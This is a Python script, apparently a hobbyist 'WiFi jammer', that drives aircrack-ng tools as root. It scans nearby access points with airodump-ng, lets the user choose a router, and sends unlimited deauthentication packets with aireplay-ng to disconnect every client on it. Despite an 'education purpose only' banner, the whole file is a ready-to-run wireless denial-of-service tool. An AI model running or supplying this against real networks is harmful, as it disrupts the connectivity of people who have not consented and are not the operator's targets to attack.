#!/usr/bin/env python3

import os
import sys
import subprocess
import time
import questionary
import csv

custom_style = questionary.Style([
    ("qmark", "fg:#00ff00 bold"),  
    ("selected", "fg:#00ff00 bold"), 
    ("pointer", "fg:#ff5f00 bold"),   
])


RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
END = '\033[0m'

class jammer():

    def __init__(self):
        print(rf"""{RED}
         __          _______ ______ _____        _         __  __ __  __ ______ _____  "
         \ \        / /_   _|  ____|_   _|      | |  /\   |  \/  |  \/  |  ____|  __ \  
          \ \  /\  / /  | | | |__    | |        | | /  \  | \  / | \  / | |__  | |__) | 
           \ \/  \/ /   | | |  __|   | |    _   | |/ /\ \ | |\/| | |\/| |  __| |  _  / 
            \  /\  /   _| |_| |     _| |_  | |__| / ____ \| |  | | |  | | |____| | \ \  
             \/  \/   |_____|_|    |_____|  \____/_/    \_\_|  |_|_|  |_|______|_|  \_\  
 
 
                                            WRITTEN BY                                 
 
 
                                        ,d                                             
                                        88                                             
                   88,dPYba,,adPYba, MM88MMM 88,dPYba,,adPYba,         8b,    ,d8  
                  88P     88      8a  88     88P   88      8a  aaaaaaaa Y8, ,8P   
                  88      88      88  88     88    88      88  aaaaaaaa  )888(    
                  88      88      88  88,    88    88      88          ,d8   8b,  
                  88      88      88   Y888  88    88      88         8P       Y8 
    
                                               GitHub                                

        {END}    """)

        print(f"""{GREEN}
    
            --------------------------------------------------------------------------------        
            ----------------------Education purpose only for gods sake----------------------        
            --------------------------------Versio-4.0--------------------------------------        
 
            --------------------------------------------------------------------------------        
            ------------------------------------USAGE---------------------------------------        
            ---                        Starts moniter interface                          ---        
            ---                            Runs airodump-ng                              ---        
            ---                     Deauthenticates whole Access point                   ---       
            ---                        revert to managed mode                            ---        
            --------------------------------------------------------------------------------        
            ------------------------------------NOTE----------------------------------------      
          {END}""")

        print(f"""{YELLOW}
            ===========================Press enter to continue==============================      
            ===========================Press ctrl + c to exit =============================         

        {END}""")

        if not os.geteuid() == 0 :
            print(f"{RED}Run it as root{END}")
            sys.exit(1)  

        try:
            cont = input("")
            if cont == "":
                airmon = subprocess.run(["which","airmon-ng"],stdout=subprocess.PIPE, text=True)
                if not airmon:
                    print("Installing required packages...")
                    time.sleep(1)
                    distro = subprocess.run(['uname','-r'],stdout=subprocess.PIPE,text=True).stdout.strip().lower()
                    if "ubuntu" in distro or "kali" in distro or "debian" in distro :
                        subprocess.run(['sudo', 'apt', 'update'], check=True)
                        subprocess.run(['sudo', 'apt', 'install', 'aircrack-ng', '-y'], check=True)
                    
                    elif "arch" in distro or "manjaro" in distro :
                        subprocess.run(['sudo', 'pacman', '-S', 'aircrack-ng','--noconfirm'], check=True)
                    else:
                        print("Please install aircrack-ng manually.")
        except:
            print(f"{RED}Error installing aircrack-ng try to install manually ...{END}")
            sys.exit(1) 
    
    def clear(self):
        subprocess.check_call(['clear'])
    
    def revert_managed_mode(self):

        print(f"{GREEN}Reverting to managed mode...{END}")
        subprocess.check_call(['airmon-ng','stop',self.wireless_interface_mon],stdout=subprocess.PIPE,text=True)
        time.sleep(1)
        subprocess.check_call(['systemctl','restart','NetworkManager'],stdout=subprocess.PIPE,text=True)
        time.sleep(1)
        self.clear()
        
    def try_again_from_start(self):

        self.interface_name()
        self.wifi_dump()
        self.type_of_attack()
    
    def interface_name(self):
        try:
            result = subprocess.run(['iwconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            # Process the output to get the interface names
            # self.interface_names = []
            self.wireless_interface_mon = None
            for line in result.stdout.splitlines():
                if 'IEEE 802.11' in line:
                    interface_name = line.split()[0]
                    self.interface_names = interface_name
                    if 'Mode:Monitor' in line:
                        self.wireless_interface_mon = interface_name
        except :
            print(f"{RED}Invalid wifi card name or you pressed ctrl + c...{END}")
            print("TRY AGAIN..")
            sys.exit(1)
        print(f"{GREEN}Killing some unwanted backgroud processes...{END}")
        subprocess.check_call(['airmon-ng','check','kill'],stdout=subprocess.PIPE,text=True)
        time.sleep(1)  
        subprocess.run(['airmon-ng','start',interface_name],stdout=subprocess.PIPE,text=True)
        self.clear()

    def retrive_info(self, index):

        self.essid = []
        self.bssid = []
        self.channel = []
        with open("dump-01.csv", mode='r') as file:
            reader = csv.reader(file)
            for row in reader:
                if len(row) > 13:
                    var = row[index]  
                    if index == 0:   #index 0 is bssid
                        if var.strip():
                            self.bssid.append(var)
                    elif index == 3:  #insex 3 is channel
                        if var.strip():
                            self.channel.append(var)
                    elif index == 13:  #index 13 is essid
                        if var.strip():
                            self.essid.append(var)
    def wifi_dump(self):
        
        print(f"{YELLOW}Dumping the wifi traffic Press ctrl + c to stop... !!{END}")
        time.sleep(1)
        self.clear()
        
        try :
            if not self.wireless_interface_mon:
                self.wireless_interface_mon = self.interface_names + "mon"
            os.system('clear')
            if os.path.exists('dump-01.csv'):
                os.remove('dump-01.csv')
            process = subprocess.Popen(['airodump-ng', '--output-format', 'csv', '--write', 'dump', self.wireless_interface_mon])

            #works as a delay or simply waits infinity long to get interrupt ctrl + c from user
            while True:
                try:
                    process.wait()
                except KeyboardInterrupt:
                    print("\nStopping the Wi-Fi dump...")
                    self.retrive_info(13)
                    process.terminate() 
                    process.wait()      
                    break
        finally:
            pass

    def try_again(self):
        self.clear()
        tryagain = questionary.confirm("Try Again?").ask()
        if tryagain:
            self.start_again()
        elif tryagain is None:
            print(f"{RED}Interrupt by user{END}")
            self.revert_managed_mode()
            return
        else :
            self.revert_managed_mode()
    
    def start_again(self):

        self.wifi_dump()
        self.type_of_attack()

    def type_of_attack(self):
        try:
            self.retrive_info(13)
            options = questionary.select(
                "Select the router you want to Jam!!",
                choices=self.essid[1:],
                style=custom_style
            ).ask()
            if options is None:
                print(f"{RED}Attack type selection cancelled by user{END}")
                self.revert_managed_mode()
                return
            index = self.essid.index(options)
            self.retrive_info(0)
            current_bssid = self.bssid[index]
            self.retrive_info(3)
            current_channel = self.channel[index]
            subprocess.run(['iwconfig', self.wireless_interface_mon, 'channel', current_channel])
            
            options = questionary.select(
                "Enter the attack type:",
                choices=[f"1. Send deauth packets to the whole Wi-Fi (knock all clients off the router)", f"2. Exit"],
                style=custom_style
            ).ask()
            if options is None:
                print(f"{RED}Attack type selection cancelled by user{END}")
                self.revert_managed_mode()
                return
            if "." in options:
                option = options.split(".")[0]
                print(option)
        
            try:
                match option:
                        case "1":
                            self.revert_status = True
                            process = subprocess.Popen(['aireplay-ng', self.wireless_interface_mon, '--deauth', '0', '-a', current_bssid])
                            process.wait()
                        case "2":
                            print(f"{RED}Exiting...{END}")
                            self.try_again()
                        
            except KeyboardInterrupt:
                    print(f"{RED}\nStopping the deauthentication...{END}")
                    time.sleep(1)
                    process.terminate()  # Terminate the process
                    process.wait()  # Wait for it to terminate
                    self.try_again()
            
        except KeyboardInterrupt:
            wannaexit = questionary.confirm("Wanna Stop?")
            if wannaexit:
                self.revert_managed_mode()
            else:
                pass

if __name__ == "__main__":
    wifi = jammer() 
    wifi.interface_name()
    wifi.wifi_dump()
    wifi.type_of_attack()   